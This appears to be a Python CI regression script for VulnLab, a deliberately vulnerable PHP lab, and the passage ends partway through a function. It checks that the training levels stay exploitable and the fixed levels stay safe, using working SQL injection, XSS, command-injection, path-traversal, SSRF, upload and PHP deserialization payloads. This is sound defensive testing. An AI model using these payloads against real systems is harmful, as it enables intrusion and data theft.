#!/usr/bin/env python3
"""VulnLab 回归验证脚本。

**它解决的问题**：靶场里的「已修复」档位（`high.php`）是一种资产 ——
它的价值在于「打不动」。但如果后来有人改代码时不小心把参数化查询改回拼接，
这个资产就悄悄失效了，而没有人会发现。

这个脚本把「哪些档位应该能打通、哪些应该打不通」变成**可执行的断言**，
挂到 CI 上。任何一次改动只要破坏了预期行为，CI 立刻变红。

换句话说：**它守护的不是功能，是安全属性。**

用法：
    python tests/verify_lab.py                          # 默认 127.0.0.1:8080
    python tests/verify_lab.py --url http://lab:8080
    python tests/verify_lab.py --json

退出码：
    0  全部断言通过
    1  有断言失败（CI 会红）
    2  靶场不可达（环境问题，不是代码问题）
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from functools import partial
from typing import Callable

TIMEOUT = 10

#: 通关凭证的正则。只有真正注入成功才能读到。
SECRET_PATTERN = re.compile(r"VULNLAB\{[^}]+\}")


# --------------------------------------------------------------------- HTTP


def http_get(url: str, timeout: float = TIMEOUT) -> tuple[int, str]:
    """发 GET 请求，返回 (状态码, 正文)。连接失败返回 (0, 错误信息)。"""
    request = urllib.request.Request(
        url, headers={"User-Agent": "VulnLab-CI/1.0 (regression-check)"}
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="ignore")
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, f"__CONNECTION_ERROR__: {exc}"


def build_url(base: str, path: str, params: dict[str, str]) -> str:
    """构造带查询参数的 URL。"""
    query = urllib.parse.urlencode(params)
    return f"{base.rstrip('/')}{path}?{query}"


# ------------------------------------------------------------------- 断言


@dataclass
class CheckResult:
    """单条断言的执行结果。"""

    name: str
    passed: bool
    expectation: str
    detail: str = ""
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "passed": self.passed,
            "expectation": self.expectation,
            "detail": self.detail,
            "evidence": self.evidence,
        }


@dataclass
class LabCheck:
    """一条检查项的完整定义。"""

    name: str
    expectation: str
    run: Callable[[str], tuple[bool, str, str]]
    """返回 (是否通过, 说明, 证据)。"""


# ------------------------------------------------------------ 各档位断言


def check_low_union_injectable(base: str) -> tuple[bool, str, str]:
    """low 档：数字型 UNION 注入应该能读到 secret。"""
    payload = "-1 UNION SELECT 1,username,secret,role FROM users"
    status, body = http_get(build_url(base, "/sqli/low.php", {"id": payload}))

    if status != 200:
        return False, f"HTTP {status}，期望 200", ""

    match = SECRET_PATTERN.search(body)
    if match:
        return True, "UNION 注入成功并读取到 secret", match.group(0)
    return False, "未读到 secret —— 注入可能被意外阻断", ""


def check_low_column_count(base: str) -> tuple[bool, str, str]:
    """low 档：原查询应仍是 4 列。

    列数是注入的前提（UNION 两侧必须一致）。如果有人改了 SELECT 的列，
    所有现成 payload 会失效，而这是很容易被忽略的破坏性改动。
    """
    marker = "CI_COLMARK_4"
    payload = f"-1 UNION SELECT '{marker}','{marker}','{marker}','{marker}'"
    status, body = http_get(build_url(base, "/sqli/low.php", {"id": payload}))

    if status == 200 and marker in body and "数据库错误" not in body:
        return True, "确认原查询为 4 列", marker
    return False, "4 列 UNION 未能成功 —— 查询列数可能已变更", ""


def check_medium_raw_payload_blocked(base: str) -> tuple[bool, str, str]:
    """medium 档：直接照抄 low 档的 payload 应该【打不通】。

    这条断言守护的是「过滤确实在生效」。如果哪天黑名单被删掉，
    这个断言会失败 —— 提醒我们 medium 档的难度设计已经名存实亡。
    """
    payload = "1' union select 1,username,secret,role from users-- "
    status, body = http_get(build_url(base, "/sqli/medium.php", {"id": payload}))

    if SECRET_PATTERN.search(body):
        return False, "裸 payload 竟然成功了 —— 黑名单过滤可能已失效", ""

    blocked = ("数据库错误" in body) or ("过滤器检测到敏感关键字" in body)
    if blocked:
        return True, "裸 payload 被过滤阻断（符合预期）", "过滤器生效"
    return False, f"未观察到过滤阻断迹象（HTTP {status}）", ""


def check_medium_bypass_works(base: str) -> tuple[bool, str, str]:
    """medium 档：双写绕过（ununionion / seselectlect / frfromom）应该能读到 secret。"""
    payload = "1' ununionion seselectlect 1,username,secret,role frfromom users-- "
    status, body = http_get(build_url(base, "/sqli/medium.php", {"id": payload}))

    if status != 200:
        return False, f"HTTP {status}，期望 200", ""

    match = SECRET_PATTERN.search(body)
    if match:
        return True, "双写绕过后成功读取 secret", match.group(0)
    return False, "双写绕过失败 —— 过滤实现可能已变更（例如换成递归替换）", ""


def check_high_rejects_injection(base: str) -> tuple[bool, str, str]:
    """high 档：注入 payload 应被类型校验拒绝，且【绝不能】读到 secret。

    ⚠️ 这是整个 CI 里最重要的一条。它守护的是「修复没有被回退」。
    """
    payload = "-1 UNION SELECT 1,username,secret,role FROM users"
    status, body = http_get(build_url(base, "/sqli/high.php", {"id": payload}))

    if SECRET_PATTERN.search(body):
        return False, "★ 严重：high 档被注入成功 —— 修复已失效！", ""

    rejected = ("输入被拒绝" in body) or ("必须是纯数字" in body)
    if rejected:
        return True, "注入被类型校验拒绝，未到达数据库", "类型校验生效"
    return False, "未观察到明确的拒绝提示 —— 校验逻辑可能被改动", ""


def check_high_normal_query_still_works(base: str) -> tuple[bool, str, str]:
    """high 档：正常查询（id=1）必须仍然可用。

    这条是**反向保护**：防止有人为了「修得更安全」而把功能改坏。
    安全修复不该以牺牲功能为代价 —— 这是常见的过度修复。
    """
    status, body = http_get(build_url(base, "/sqli/high.php", {"id": "1"}))

    if status != 200:
        return False, f"HTTP {status}，期望 200", ""
    if "admin" in body:
        return True, "正常查询返回 admin，功能完好", "admin"
    return False, "正常查询未返回预期数据 —— 修复可能过度，破坏了功能", ""


def check_no_error_dump_in_high(base: str) -> tuple[bool, str, str]:
    """high 档：不应回显数据库错误信息。

    错误信息会泄漏表名/列名/数据库版本，是攻击者构造 payload 的重要依据。
    """
    payload = "1'"
    status, body = http_get(build_url(base, "/sqli/high.php", {"id": payload}))

    leaked = re.search(r"SQLSTATE\[|syntax error|unrecognized token", body, re.I)
    if leaked:
        return False, "high 档回显了数据库错误 —— 错误信息收敛已失效", leaked.group(0)
    return True, "未回显数据库错误信息", ""


def check_low_error_visible_by_design(base: str) -> tuple[bool, str, str]:
    """low 档：**应该**回显数据库错误（这是刻意保留的教学信息）。

    同样属于「守护设计意图」：如果有人「顺手」把 low 档的报错也关掉了，
    报错型注入的教学价值就没了，但功能测试不会发现。
    """
    payload = "1'"
    status, body = http_get(build_url(base, "/sqli/low.php", {"id": payload}))

    if re.search(r"SQLSTATE\[|syntax error|unrecognized token|数据库错误", body, re.I):
        return True, "low 档按设计回显数据库错误", "报错可见"
    return False, "low 档未回显数据库错误 —— 报错型注入的教学场景可能已被破坏", ""


# ------------------------------------------------------------ XSS 场景断言


def _xss_probe(base: str, level: str, payload: str) -> str:
    """向 XSS 场景发送载荷，返回响应正文。"""
    url = build_url(base, f"/xss/{level}.php", {"name": payload})
    status, body = http_get(url)
    return body if status == 200 else ""


def check_xss_low_reflects(base: str) -> tuple[bool, str, str]:
    """low 档：载荷应被未转义地输出（构成可执行标签）。"""
    payload = '<script>alert("VULNLAB_CI_MARKER")</script>'
    body = _xss_probe(base, "low", payload)

    if f"<script>alert(\"VULNLAB_CI_MARKER\")</script>" in body:
        return True, "载荷被未转义输出，构成可执行脚本标签", "未转义回显"
    return False, "载荷未以未转义形态出现 —— XSS 场景可能已被改坏", ""


def check_xss_medium_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档：img + 事件属性应能绕过标签黑名单。"""
    payload = '<img src=x onerror=alert("VULNLAB_CI_MARKER")>'
    body = _xss_probe(base, "medium", payload)

    if f'<img src=x onerror=alert("VULNLAB_CI_MARKER")>' in body:
        return True, "img 事件属性绕过了 script 标签黑名单", "绕过成功"
    return False, "img 载荷未未转义输出 —— 绕过点可能已被堵上", ""


def check_xss_high_escapes(base: str) -> tuple[bool, str, str]:
    """high 档：任何载荷都不该以未转义形态出现。"""
    for payload in [
        '<script>alert("VULNLAB_CI_MARKER")</script>',
        '<img src=x onerror=alert("VULNLAB_CI_MARKER")>',
    ]:
        body = _xss_probe(base, "high", payload)
        if '<script>alert("VULNLAB_CI_MARKER")' in body:
            return False, "★ 严重：high 档出现未转义的 script 标签", ""
        if '<img src=x onerror=alert("VULNLAB_CI_MARKER")>' in body:
            return False, "★ 严重：high 档出现未转义的 img 标签", ""
    return True, "载荷均被 HTML 实体编码（输出编码生效）", "htmlspecialchars 生效"


# ------------------------------------------------------------ 上传场景断言


def _post_multipart(
    base: str, path: str, filename: str, content: bytes, content_type: str = "text/plain"
) -> str:
    """构造并发送一个 multipart/form-data 上传请求，返回响应正文。"""
    boundary = "----VulnLabCICheckBoundary"
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
    ).encode()
    tail = f"\r\n--{boundary}--\r\n".encode()
    payload = head + content + tail

    request = urllib.request.Request(
        f"{base.rstrip('/')}{path}",
        data=payload,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "VulnLab-CI/1.0 (regression-check)",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
            return response.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", errors="ignore")
    except (urllib.error.URLError, TimeoutError, OSError):
        return ""


def check_upload_low_accepts_script(base: str) -> tuple[bool, str, str]:
    """low 档：应接受任意文件（含可执行脚本后缀）。

    注意：这里上传的是**纯文本内容**，只是文件名带 .php。
    目的是验证「接口是否接受这个文件名」，而不是真的投递可执行代码 ——
    CI 环境里不该留下能被执行的东西。
    """
    body = _post_multipart(
        base, "/upload/low.php", "ci_probe_marker.php", b"VULNLAB_CI_UPLOAD_PROBE"
    )
    if "上传成功" in body and "ci_probe_marker.php" in body:
        return True, "接受 .php 后缀（零校验）", "上传成功"
    return False, "未接受 .php 文件 —— 场景可能已被改坏", ""


def check_upload_high_rejects_script(base: str) -> tuple[bool, str, str]:
    """high 档：应拒绝 .php 后缀。"""
    body = _post_multipart(
        base, "/upload/high.php", "ci_probe_marker.php", b"VULNLAB_CI_UPLOAD_PROBE"
    )
    if "上传被拒绝" in body and "不在白名单内" in body:
        return True, "后缀白名单拒绝 .php", "白名单生效"
    if "上传成功" in body:
        return False, "★ 严重：high 档接受了 .php 文件 —— 修复已失效", ""
    return False, "未观察到明确的拒绝提示", ""


# ------------------------------------------------------------ SSRF 场景断言


def check_ssrf_low_reaches_internal(base: str, internal_base: str) -> tuple[bool, str, str]:
    """low 档：应能被诱导访问内网服务。"""
    target = f"{internal_base}/internal/inner-service.php"
    status, body = http_get(build_url(base, "/ssrf/low.php", {"url": target}))

    if status != 200:
        return False, f"HTTP {status}", ""
    if "VULNLAB{ssrf_reached_internal_service}" in body:
        return True, "成功读取内网服务内容", "VULNLAB{ssrf_reached_internal_service}"
    if "请求失败" in body:
        return False, "请求失败 —— 内网服务（8090）可能未启动", ""
    return False, "未读到内网服务内容", ""


def check_ssrf_high_blocks_internal(base: str, internal_base: str) -> tuple[bool, str, str]:
    """high 档：打内网应被拒绝，且【绝不能】读到内容。"""
    internal_host = internal_base.replace("http://", "").replace("https://", "")
    for target in [
        f"{internal_base}/internal/inner-service.php",
        # localhost 是 medium 档的绕过点，high 档必须也拦住它
        f"http://localhost:{internal_host.split(':')[-1]}/internal/inner-service.php",
    ]:
        status, body = http_get(build_url(base, "/ssrf/high.php", {"url": target}))
        if "VULNLAB{ssrf_reached_internal_service}" in body:
            return False, f"★ 严重：high 档被绕过并读到内网内容（{target}）", ""
    return True, "内网地址被解析后校验拒绝（含 localhost 写法）", "解析后校验生效"


def check_ssrf_high_blocks_file_scheme(base: str) -> tuple[bool, str, str]:
    """high 档：file:// 协议应被协议白名单拒绝。"""
    status, body = http_get(
        build_url(base, "/ssrf/high.php", {"url": "file:///C:/Windows/win.ini"})
    )
    if "不在白名单内" in body:
        return True, "file 协议被协议白名单拒绝", "协议白名单生效"
    if "for 16-bit app support" in body:
        return False, "★ 严重：high 档允许了 file 协议并读到本地文件", ""
    return False, "未观察到明确的协议拒绝提示", ""


# ------------------------------------------------------------ 命令注入断言


def _cmdi_output_block(body: str) -> str:
    """从响应里抠出「命令输出」区块的内容。

    为什么要专门抠这一块：靶场页面会把**服务端实际执行的命令**也展示出来，
    所以响应里必然包含我们注入的 payload。如果直接在整个 body 里找 marker，
    会把「页面展示了命令」误判成「命令被执行了」。

    这和 ASP 项目里「负向对照校验」是同一个思路 ——
    **排除「检测特征被检测行为本身制造出来」的可能。**
    """
    match = re.search(r"命令输出</h3>\s*<pre[^>]*>(.*?)</pre>", body, re.S)
    return match.group(1) if match else ""


def _cmdi_probe(base: str, level: str, payload: str) -> str:
    """向 cmdi 场景发送载荷，返回响应正文。"""
    status, body = http_get(build_url(base, f"/cmdi/{level}.php", {"ip": payload}))
    return body if status == 200 else ""


def check_cmdi_low_injectable(base: str) -> tuple[bool, str, str]:
    """low 档：应能通过 `&` 追加命令。

    用 `echo 固定标记串` 而不是 `whoami`：后者的输出因环境而异（用户名/机器名），
    无法作为稳定判据。echo 在 Windows cmd 和 Unix sh 上行为一致。
    """
    marker = "VULNLAB_CI_CMDI_MARKER"
    body = _cmdi_probe(base, "low", f"127.0.0.1 & echo {marker}")

    if marker in _cmdi_output_block(body):
        return True, "通过 & 追加命令成功，echo 输出出现在命令输出区块", marker
    if "Fatal error" in body or "Parse error" in body:
        return False, "页面存在 PHP 错误（可能是用了当前 PHP 版本不支持的语法）", ""
    return False, "未在命令输出区块看到 marker —— 注入场景可能已被改坏", ""


def check_cmdi_medium_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档：黑名单漏掉了 `&`，应该能绕过。

    这个漏项是刻意设计的 —— 模拟「开发者在 Unix 上写黑名单，
    想的是 `;` `|` 却漏掉了 Windows cmd 的 `&`」这个真实疏漏。
    """
    marker = "VULNLAB_CI_CMDI_MARKER"
    body = _cmdi_probe(base, "medium", f"127.0.0.1 & echo {marker}")

    if marker in _cmdi_output_block(body):
        return True, "& 绕过了字符黑名单（黑名单只堵了 Unix 风格的分隔符）", marker
    if "过滤器命中" in body:
        return False, "& 被过滤器拦下了 —— 本档的绕过点可能已被堵上", ""
    return False, "未观察到预期的绕过行为", ""


def check_cmdi_medium_blocks_semicolon(base: str) -> tuple[bool, str, str]:
    """medium 档：`;` 应该被黑名单拦下（作为对照，证明过滤器在工作）。"""
    body = _cmdi_probe(base, "medium", "127.0.0.1; whoami")
    if "过滤器命中" in body:
        return True, "分号被过滤器拦下（过滤器确实在生效）", "过滤器生效"
    return False, "分号未被拦下 —— 过滤器可能已失效", ""


def check_cmdi_high_blocks_injection(base: str) -> tuple[bool, str, str]:
    """high 档：注入载荷应被白名单拒绝，且【绝不能】执行。

    ⚠️ 这是整个命令注入场景里最重要的一条 —— 它守护「修复没有被回退」。
    命令注入一旦失效，后果是直接拿到系统命令执行权限。
    """
    marker = "VULNLAB_CI_CMDI_MARKER"
    for payload in [
        f"127.0.0.1 & echo {marker}",
        "127.0.0.1; whoami",
        "127.0.0.1 | whoami",
    ]:
        body = _cmdi_probe(base, "high", payload)
        if "Fatal error" in body or "Parse error" in body:
            return False, "★ high 档存在 PHP 错误 —— 修复代码本身有问题", ""
        if marker in _cmdi_output_block(body):
            return False, "★ 严重：high 档被注入成功 —— 修复已失效！", ""
        if "hediwen" in _cmdi_output_block(body):
            return False, "★ 严重：high 档执行了 whoami", ""

    return True, "注入载荷均被白名单拒绝，未产生任何命令执行", "白名单 + 转义生效"


def check_cmdi_high_normal_input_works(base: str) -> tuple[bool, str, str]:
    """high 档：合法的 IP 输入必须仍然可用。

    这条是**反向保护** —— 防止有人为了「修得更安全」把功能改坏。
    安全修复不该以牺牲功能为代价。
    """
    body = _cmdi_probe(base, "high", "127.0.0.1")
    if "输入不合法" in body:
        return False, "合法 IP 被拒绝了 —— 修复过度，破坏了功能", ""
    if "Fatal error" in body or "Parse error" in body:
        return False, "★ high 档存在 PHP 错误（兼容性问题）", ""
    if _cmdi_output_block(body).strip():
        return True, "合法 IP 正常执行，功能完好", "ping 有输出"
    return False, "合法 IP 未产生输出 —— 功能可能已被改坏", ""


# ------------------------------------------------------------ 全页面健康检查


def check_all_pages_render_without_php_error(base: str) -> tuple[bool, str, str]:
    """所有 PHP 页面都能正常渲染，且没有致命错误。

    <h3>为什么需要这条断言</h3>
    PHP 的错误分两类：
      · **语法错误**（Parse error）—— `php -l` 能查出来，CI 里有专门的步骤
      · **运行时错误**（`Fatal error: Call to undefined function ...`）——
        连语法检查都过得了，**只有实际访问页面才会暴露**

    后一类在**版本兼容**问题上特别常见。开发这个靶场时真的踩到两次：

      1. `str_starts_with()` —— PHP 8.0 才引入，用在 7.3 上
      2. 箭头函数 `fn() =>` —— PHP 7.4 才引入，用在 7.3 上

    两次的表现都一样：**页面那一块内容直接消失**，不报错、不告警，
    而 `php -l` 完全正常。当时的 CI 只测 7.4 和 8.1，恰好漏掉了本机在用的 7.3。

    所以这条断言的价值是：**用所有页面兜一遍，把「白屏」这类问题变成 CI 可捕获的。**
    """
    from pathlib import Path

    html_root = Path(__file__).resolve().parent.parent / "html"
    if not html_root.is_dir():
        return False, f"找不到 html 目录: {html_root}", ""

    checked = 0
    problems: list[str] = []

    for php_file in sorted(html_root.rglob("*.php")):
        rel = php_file.relative_to(html_root).as_posix()
        # data 目录是运行时生成的，跳过
        if rel.startswith("data/"):
            continue

        status, body = http_get(f"{base}/{rel}")
        checked += 1

        if status != 200:
            problems.append(f"{rel} → HTTP {status}")
            continue

        for pattern in ("Fatal error", "Parse error", "Uncaught Error"):
            index = body.find(pattern)
            if index >= 0:
                detail = body[index : index + 120].replace("\n", " ")
                problems.append(f"{rel} → {detail}")
                break

    if problems:
        summary = f"{len(problems)} 个页面有问题（共检查 {checked} 个）"
        return False, summary, " / ".join(problems[:3])

    return True, f"{checked} 个页面全部正常渲染，无 PHP 致命错误", f"checked={checked}"


# ------------------------------------------------------------ 语法兼容性检查


#: PHP 7.4+ / 8.x 专有的函数与语法 —— 用了会导致 Fatal error。
#:
#: 靶场声明兼容 PHP 7.2+，而开发机跑的是 7.3、CI 跑 7.3/7.4/8.1。
#: 用高版本的写法会让**低版本环境直接白屏**。
PHP_TOO_NEW_PATTERNS: tuple[tuple[str, str], ...] = (
    (r"\bstr_starts_with\s*\(", "str_starts_with() —— PHP 8.0+"),
    (r"\bstr_ends_with\s*\(", "str_ends_with() —— PHP 8.0+"),
    (r"\bstr_contains\s*\(", "str_contains() —— PHP 8.0+"),
    # 属性类型声明 —— PHP 7.4+。
    # 匹配 `public string $x` / `private ?Foo $y` / `protected int|string $z`，
    # 以及构造函数属性提升 `__construct(private string $name)`。
    # 不会误伤 `public function foo(string $a)`：那里 function 后面跟的是
    # 函数名和 `(`，不构成「修饰符 + 类型 + 变量」的形状。
    (
        r"(?<![\w$])(?:public|protected|private)\s+(?:static\s+)?"
        r"\??[A-Za-z_\\][A-Za-z0-9_\\]*"
        r"(?:\s*\|\s*\??[A-Za-z_\\][A-Za-z0-9_\\]*)*\s+\$\w+",
        "属性类型声明（如 public string $x）—— PHP 7.4+",
    ),
    (r"(?<![=!<>])=(?!=)\s*fn\s*\(", "箭头函数 fn() —— PHP 7.4+"),
    (r"\?\?=", "null 合并赋值 ??= —— PHP 7.4+"),
    (r"\?->", "nullsafe 运算符 ?-> —— PHP 8.0+"),
    (r"^\s*return\s+match\s*\(", "match 表达式 —— PHP 8.0+"),
    (r"^\s*match\s*\(.*\)\s*\{", "match 表达式 —— PHP 8.0+"),
    (r"^\s*enum\s+\w+", "enum 声明 —— PHP 8.1+"),
    (r"\breadonly\s+(public|private|protected)?\s*\w+\s+\$", "readonly 属性 —— PHP 8.1+"),
    (r"\bnever\s*\)\s*:", "never 返回类型 —— PHP 8.1+"),
)


def _strip_php_comments(text: str) -> str:
    """剥掉 PHP 注释，只留真实代码。

    ⚠️ 这一步不能省 —— 否则「注释里提到了某个函数名」会被误判成真实调用。

    这个坑我自己就踩了：注释里写着「这里不能用 str_starts_with()，它是 PHP 8 才有的」，
    结果静态检查把这个**说明性的注释**报成了违规。

    **做静态检查工具时，处理注释是第一步，不是可选项。**

    同时在注释位置填上等长空白，保持行号不变（方便报错时定位）。
    """
    import re as _re

    def blank(match: "_re.Match[str]") -> str:
        # 保留换行符，其余字符替换成空格 —— 行号才不会错位
        return "".join("\n" if ch == "\n" else " " for ch in match.group(0))

    # 块注释 /* ... */（含跨行）
    text = _re.sub(r"/\*.*?\*/", blank, text, flags=_re.S)
    # 行注释 // ...
    text = _re.sub(r"//[^\n]*", blank, text)
    # # 注释（避免误伤 #! 和字符串里的 #，这里只处理行首是 # 的）
    text = _re.sub(r"(?m)^(\s*)#[^\n]*", lambda m: m.group(1) + " " * len(m.group(0)[len(m.group(1)):]), text)
    return text


def check_no_php_too_new_syntax(base: str = "") -> tuple[bool, str, str]:
    """静态检查：源码里不能出现高版本 PHP 专有的函数/语法。

    <h3>为什么这条必须自动化</h3>

    这个坑我**踩了三次** —— 而且三次表现完全一样：

      · `str_starts_with()`（PHP 8.0）用在 7.3 上
      · 箭头函数 `fn() =>`（PHP 7.4）用在 7.3 上
      · 又一次 `str_starts_with()` —— 就在刚写的 LFI high 档里，
        尽管我前两次已经记录过这个坑

    三次的症状都是：**页面某一整块内容直接消失，不报错不告警，
    而 `php -l` 完全正常**（函数不存在是运行时错误，语法检查抓不到）。

    **靠"记住"是没用的 —— 人类的记忆挡不住重复犯错，工具才能。**

    实现上有个容易忽略的点：**必须先剥掉注释再扫描**。
    否则「注释里提到某个函数名」会被误判（这个误判我也真踩了）。
    """
    from pathlib import Path

    html_root = Path(__file__).resolve().parent.parent / "html"
    if not html_root.is_dir():
        return False, f"找不到 html 目录: {html_root}", ""

    import re as _re

    problems: list[str] = []
    scanned = 0

    for php_file in sorted(html_root.rglob("*.php")):
        rel = php_file.relative_to(html_root).as_posix()
        if rel.startswith("data/"):
            continue

        try:
            source = php_file.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue

        code_only = _strip_php_comments(source)
        scanned += 1

        for lineno, line in enumerate(code_only.splitlines(), 1):
            for pattern, label in PHP_TOO_NEW_PATTERNS:
                if _re.search(pattern, line):
                    problems.append(f"{rel}:{lineno} 用了 {label}")

    if problems:
        return (
            False,
            f"发现 {len(problems)} 处高版本 PHP 专有语法",
            " / ".join(problems[:3]),
        )

    return True, f"未发现高版本 PHP 专有语法（扫了 {scanned} 个文件）", ""


# ------------------------------------------------------------ 文件包含断言


def _lfi_probe(base: str, level: str, page: str) -> str:
    """向 lfi 场景发送载荷，返回响应正文。"""
    status, body = http_get(build_url(base, f"/lfi/{level}.php", {"page": page}))
    return body if status == 200 else ""


def check_lfi_low_traversal(base: str) -> tuple[bool, str, str]:
    """low 档：路径穿越应该成功。

    判据用 `../index.php`（靶场首页）—— 它被 include 后会输出明显的内容
    （"漏洞矩阵" 等），可以可靠判定。

    ⚠️ 这里换过两次判据，都因为"看起来更真实"而失败：

      · `../../config.php` —— 它被 include 时会【执行】，
        只定义常量和函数、不输出内容，从响应里根本看不出是否包含成功

      · `../../../../Windows/win.ini` —— **依赖目录深度**。
        靶场放在 `<盘符>/Users/<用户>/WorkBuddy/<项目>/vulnlab/html/lfi/pages`，
        要上到盘符根需要 9 级 `../`，4 级根本到不了。
        换个目录层级就失效 —— 这种判据不能用。

    **教训：测试判据不应该依赖环境的具体形态。**
    """
    body = _lfi_probe(base, "low", "../../lfi_probe.txt")
    if "VULNLAB_LFI_PROBE_MARKER" in body:
        return True, "路径穿越成功（读到了 pages/ 之外的文件）", "VULNLAB_LFI_PROBE_MARKER"
    return False, "路径穿越未成功 —— 场景可能已被改坏", ""


def check_lfi_medium_blocks_plain_traversal(base: str) -> tuple[bool, str, str]:
    """medium 档：裸的 `../` 应该被黑名单拦下（证明过滤器在工作）。"""
    body = _lfi_probe(base, "medium", "../../lfi_probe.txt")
    if "过滤器命中" in body:
        return True, "裸 `../` 被黑名单拦下", "过滤器生效"
    return False, "裸 `../` 未被拦下 —— 过滤器可能已失效", ""


def check_lfi_medium_double_write_bypass(base: str) -> tuple[bool, str, str]:
    """medium 档：双写 `....//` 应该能绕过。

    原理：`str_replace('../', '', '....//')` → `../`
    （单次替换后剩下的字符正好拼回危险片段）

    判据同样用 index.php —— 不依赖系统路径、不依赖目录深度。
    """
    body = _lfi_probe(base, "medium", "....//....//lfi_probe.txt")
    if "VULNLAB_LFI_PROBE_MARKER" in body:
        return True, "双写绕过成功（单次替换把 `../` 拼了回来）", "....// → ../"
    if "过滤器命中" in body:
        return False, "双写被拦下了 —— 本档的绕过点可能已被堵上", ""
    return False, "双写未产生预期效果", ""


def check_lfi_high_blocks_all(base: str) -> tuple[bool, str, str]:
    """high 档：所有穿越载荷应被白名单拒绝，且【绝不能】读到外部文件。

    ⚠️ 这条守护的是「修复没有被回退」——
    文件包含一旦失守，配合文件上传就能直接 getshell。
    """
    attacks = [
        "../../lfi_probe.txt",
        "....//....//lfi_probe.txt",
        "../../config.php",
        "/etc/passwd",
    ]
    for payload in attacks:
        body = _lfi_probe(base, "high", payload)
        if "VULNLAB_LFI_PROBE_MARKER" in body:
            return False, f"★ 严重：high 档被绕过（{payload}）", ""
        if "DB_DRIVER" in body:
            return False, f"★ 严重：high 档包含到了 config.php（{payload}）", ""

    return True, "所有穿越载荷均被白名单拒绝", "白名单映射生效"


def check_lfi_high_normal_works(base: str) -> tuple[bool, str, str]:
    """high 档：白名单内的页面必须仍能正常加载。

    反向保护 —— 防止为了「更安全」把功能改坏。
    """
    body = _lfi_probe(base, "high", "about")
    if "关于 VulnLab" in body:
        return True, "白名单内的页面正常加载", "about 可用"
    if "不在白名单内" in body:
        return False, "合法页面被拒绝了 —— 修复过度，破坏了功能", ""
    return False, "合法页面未正常加载", ""


# ----------------------------------------------------------- 反序列化场景断言


# 探针文件名 —— 断言跑完会删掉，不在靶场里留垃圾。
_POP_PROBE_NAME = "ci_pop_probe_marker.txt"
_POP_PROBE_BODY = "VULNLAB_CI_POP_CHAIN_PROBE"


def _uploads_dir() -> "Path":
    """靶场的 uploads 目录（绝对路径）。"""
    from pathlib import Path

    return Path(__file__).resolve().parent.parent / "html" / "uploads"


def _pop_probe_path() -> "Path":
    return _uploads_dir() / _POP_PROBE_NAME


def _cleanup_pop_probe() -> None:
    _pop_probe_path().unlink(missing_ok=True)


def _post_form(base: str, path: str, fields: dict[str, str]) -> str:
    """发送 application/x-www-form-urlencoded 的 POST，返回响应正文。

    反序列化场景的输入是个 `<textarea>`，不是文件上传，
    所以不能复用抓包那套 multipart 的写法。
    """
    data = urllib.parse.urlencode(fields).encode()
    request = urllib.request.Request(
        f"{base.rstrip('/')}{path}",
        data=data,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "VulnLab-CI/1.0 (regression-check)",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
            return response.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", errors="ignore")
    except (urllib.error.URLError, TimeoutError, OSError):
        return ""


def _pop_chain_payload(
    filename: str,
    content: str,
    lowercase: bool = False,
    dir_: str | None = None,
) -> str:
    """手工构造 `Cache → FileStore` 的 POP 链序列化串。

    格式拆解：

        O:<类名字节数>:"<类名>":<属性个数>:{ 键;值; 键;值; ... }

    ⚠️ 所有长度都是**字节数**，不是字符数 —— 这是手工构造时最容易算错的地方。
    纯 ASCII 时两者相同，一旦掺进中文就会差出好几字节，整串直接报废。
    这里统一先 `encode()` 再取长度，避免依赖「碰巧都是 ASCII」。

    这里故意手写而不是调 PHP 生成：手写的串能原样贴进 Writeup，
    读者可以逐段对照上面这行格式说明，看清它是怎么拼出来的。

    Args:
        dir_: 写入目录。默认用**绝对路径**（从 `__file__` 推导），
            这样断言不受 PHP 进程工作目录影响。
            传相对路径则用于验证「页面上提示的那个路径」是否真的可用 ——
            见 `check_unserialize_documented_relative_path`。
    """

    def s(text: str) -> str:
        """序列化一个字符串。"""
        return f's:{len(text.encode("utf-8"))}:"{text}";'

    upload_dir = dir_ if dir_ is not None else _uploads_dir().as_posix() + "/"
    cls_cache = "cache" if lowercase else "Cache"
    cls_store = "filestore" if lowercase else "FileStore"

    store = f'O:{len(cls_store.encode())}:"{cls_store}":1:{{{s("dir")}{s(upload_dir)}}}'
    props = f'{s("key")}{s(filename)}{s("value")}{s(content)}{s("store")}{store}'
    return f'O:{len(cls_cache.encode())}:"{cls_cache}":3:{{{props}}}'


def _unserialize_probe(base: str, level: str, payload: str) -> tuple[bool, str]:
    """把 payload 投给指定档，返回 (是否真的写出了探针文件, 响应正文)。

    判据落在**文件系统**上，而不是页面文案 ——
    文案会随着改版变，文件不会说谎。
    """
    _uploads_dir().mkdir(parents=True, exist_ok=True)
    _cleanup_pop_probe()
    body = _post_form(base, f"/unserialize/{level}.php", {"data": payload})
    wrote = _pop_probe_path().exists()
    _cleanup_pop_probe()
    return wrote, body


def check_unserialize_low_pop_chain(base: str) -> tuple[bool, str, str]:
    """low 档：`Cache → FileStore` 的 POP 链应该写出文件。

    这个场景最值得注意的一点：**攻击者不需要触发任何功能**。
    反序列化这个动作本身就完成了触发 —— 因为 `unserialize()` 出来的对象
    会在脚本结束时被销毁，而 `__destruct` 就是在那时候跑的。
    """
    payload = _pop_chain_payload(_POP_PROBE_NAME, _POP_PROBE_BODY)
